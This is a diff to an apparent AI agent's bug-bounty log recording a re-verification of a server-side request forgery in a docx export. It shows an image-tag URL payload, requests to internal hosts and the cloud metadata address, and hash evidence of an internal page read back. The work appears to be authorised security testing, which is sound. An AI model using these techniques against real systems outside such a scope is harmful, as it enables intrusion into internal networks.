@@ -3053,3 +3053,68 @@ Sent as `message_html`, read back after server sanitisation:
 1. Sweep the remaining populated resources for the same inversion pattern (audit_surveys 160, bookings 34, skills 122) — compare Owner vs Tester ID sets.
 2. Re-verify BUG-016 SSRF readback (same inference risk that cost BUG-022).
 3. `table/export` shape — get the exact `ab:export.header` array from the bundle to unblock mass export.
+
+## Session 2026-11-11 (eee): ✅ BUG-016 RE-VERIFIED — both claims hold. SHA-256 byte match proves readback.
+
+### Operator
+- "okay reverify bug 016"
+
+### Why this mattered
+- BUG-022 (stored XSS) was retracted because I claimed impact without a second-user reproduction. BUG-016 rested on a similar inference ("I saw 8,741 bytes, so it must be the login page"). Needed the same rigour.
+
+### T-470 — tokens
+- OWNER(231,r5) SYSADMIN(53,r2) login 200.
+
+### T-471 — first attempt: no media entry
+- `<img src="https://httpbin.org/base64/<b64>">` -> 200, docx 1856B, **media=[]**.
+- Reason: URL has no image extension. The lever is the extension, not the content.
+
+### T-472 — 🔑 CONTROL A: unique marker, extension varied (same host, same content)
+- Marker `ZXEXTbafaefcc` in the path of `httpbin.org/anything/` (echoes path in body):
+  | URL | media | marker embedded |
+  | --- | --- | --- |
+  | `/anything/ZXEXTbafaefcc` | none | **False** |
+  | `/anything/ZXEXTbafaefcc.ico` | `media/image.ico` 705B | **True** |
+  | `/anything/ZXEXTbafaefcc.png` | `media/image.png` 720B | **True** |
+- **Proves**: the extension alone decides packaging, and the packaged bytes ARE the fetched response body (my unique marker is inside them).
+
+### T-473 — CONTROL C: internal targets with the lever applied
+| target | media | bytes |
+| --- | --- | --- |
+| `integrations.qa.soxhubapp.com/version.ico` | image.ico | **0** |
+| `integrations.qa.soxhubapp.com/api/v1/health.ico` | image.ico | **0** |
+| `bugbounty1.qe.optrostaging.ai/login.ico` | image.ico | **8,741** |
+| `bugbounty1.qe.optrostaging.ai/api/v1/users/me.ico` | image.ico | **0** |
+| `169.254.169.254/latest/meta-data/.ico` | image.ico | **0** |
+| `localhost:3000/version.ico` | render 500 | — |
+- Confirms the honest ceiling: **HTML readback works; JSON endpoints and IMDS return 0 bytes.**
+
+### T-474 — 🔑 CONTROL B: SHA-256 byte-for-byte match
+```
+embedded : 8741 bytes  sha256 d98e403e2d678376402d865da959064feb79034858cb7c276c9ed9c96e426b0d
+direct   : 8741 bytes  sha256 d98e403e2d678376402d865da959064feb79034858cb7c276c9ed9c96e426b0d
+identical: True
+```
+- Embedded `media/image.ico` head: `<!doctype html>\n<html lang="en" dir="ltr">...`
+- Tail: `performance.mark('body-end'); </script>\n\t</body>\n</html>\n`
+- `<title>Optro</title>` present in the embedded copy.
+- **The embedded bytes are byte-identical to the live response. Not a placeholder, not a template artifact.**
+
+### Verdict — BUG-016 VERIFIED, P2 stands
+- **Claim 1 (server-side fetch):** proven — extension-varied control with unique marker.
+- **Claim 2 (full readback):** proven — SHA-256 identical to direct fetch.
+- **Ceiling confirmed:** HTML only. JSON/IMDS return 0 bytes. Report already stated this; now evidenced.
+
+### Report updated
+- `reports/BUG-016-ssrf-full-read-docx-embed.md` -> **257 lines**.
+- New **§4.1 Independent verification (re-run 2026-11-11)** with Control A (marker/extension), Control B (SHA-256 match), Control C (internal target matrix).
+- Summary updated with the hash reference.
+
+### Net
+- **BUG-016 is solid.** Unlike BUG-022, this one survives adversarial re-verification with a cryptographic proof.
+- Confirmed findings now: BUG-008 (submitted), BUG-015 (P1 chain), **BUG-016 (P2, re-verified)**, BUG-017 (P1 ATO), BUG-018 (P2 RBAC), BUG-019 (P2 inversion, 2 resources), BUG-023 (P4 HTML injection).
+
+### Next queue (fff)
+1. BUG-015 re-verify the same way (file-delete chain — does the victim really lose the file, and is the delete genuinely cross-user?).
+2. BUG-017 re-verify (email hijack — does login with the hijacked address work from a clean session?).
+3. Continue new-surface hunting.
